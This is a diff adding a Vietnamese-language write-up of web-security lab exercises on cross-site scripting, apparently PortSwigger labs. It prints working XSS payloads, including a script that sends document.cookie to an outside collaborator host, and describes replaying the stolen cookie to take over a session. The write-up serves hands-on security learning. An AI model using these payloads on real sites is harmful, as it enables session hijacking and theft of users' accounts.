@@ -518,6 +518,73 @@ Tôi thử `javascript:alert(1)` nhưng không được
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/b048d619-c2ee-4075-91d9-dff39a208554)
+
+![image](https://github.com/user-attachments/assets/fcac228e-eff4-4745-a7e8-09899d269f8f)
+
+Tôi nhập thử `<h1>test</h1>` thì nó ra mã hóa như này:
+
+![image](https://github.com/user-attachments/assets/3db67330-e186-4643-9c98-5cea6883128b)
+
+Cái chỉ chặn `' " < > \ /` thôi nên tôi tìm cách khác để chạy alert, sau 1 lúc thì tôi nghĩ đến trường hợp biến nằm trong string và tôi tìm được cái [này](https://stackoverflow.com/questions/3304014/how-to-interpolate-variables-in-strings-in-javascript-without-concatenation):
+
+![image](https://github.com/user-attachments/assets/b60e9743-10c3-4b57-b905-d5ead13e27ef)
+
+![image](https://github.com/user-attachments/assets/ef466ea1-f15e-4ade-9589-8907e4f7eaab)
+
+Payload: `${alert(1)}`
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/fc087a4c-9c4d-4186-8af6-b25530525233)
+
+![image](https://github.com/user-attachments/assets/ae58c034-7af5-4cce-8516-d79ff8a641ae)
+
+Test thử với `</p><script>alert(1)</script><p>lmao`
+
+![image](https://github.com/user-attachments/assets/c5e88adb-2f83-462a-aade-d54154d7c91c)
+
+![image](https://github.com/user-attachments/assets/1c9dbe2e-28c5-43c9-88bd-60405027536e)
+
+Và nó chả có lọc gì cả, nâng cấp payload lên `lmao</p><script>new Image().src = "https://fdw65qre4x2pdlvblcb3fpuir9x0lq9f.oastify.com/?cookie=" + document.cookie;</script><p>abcd`, khi gọi new Image(), trình duyệt tạo một phần tử <img> ẩn mà không cần hiển thị trên trang. Khi đặt src thành một URL, trình duyệt tự động thực hiện một yêu cầu GET đến URL đó, nó tạo một yêu cầu HTTP đến một URL bên ngoài, cho phép gửi dữ liệu (chẳng hạn như document.cookie), ban đầu tôi có thử thẻ `<img>` nhưng không được do thẻ `<img>` chỉ tải hình ảnh từ URL mà không thể chạy JavaScript
+
+![image](https://github.com/user-attachments/assets/2bb49f1e-7350-45ef-8da3-dc2805cbdec2)
+
+![image](https://github.com/user-attachments/assets/29290bd0-b466-4204-86c8-e03ea1593620)
+
+![image](https://github.com/user-attachments/assets/0ad7ba96-af38-4948-bc05-4cf3128fbe24)
+
+![image](https://github.com/user-attachments/assets/6e5828aa-9453-48eb-91e6-164607ab9978)
+
+Ném bừa 1 cái request vào repeater và đổi cookies, gửi request là xong
+
+![image](https://github.com/user-attachments/assets/3715d641-e2f4-4d99-93f6-e54e9c40eef2)
+
+Ở solution thì dùng cách khác thay vì dùng ảnh như tôi 
+
+![image](https://github.com/user-attachments/assets/53f075a6-3aeb-434f-a2fc-68ed374e40fa)
+
+fetch() là một hàm JavaScript dùng để gửi yêu cầu HTTP (GET, POST, PUT, DELETE...) và lấy dữ liệu từ máy chủ, sử dụng method POST, cho phép gửi request mà không bị CORS chặn, còn CORS là gì thì chưa tìm hiểu, và cái body là cookie
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
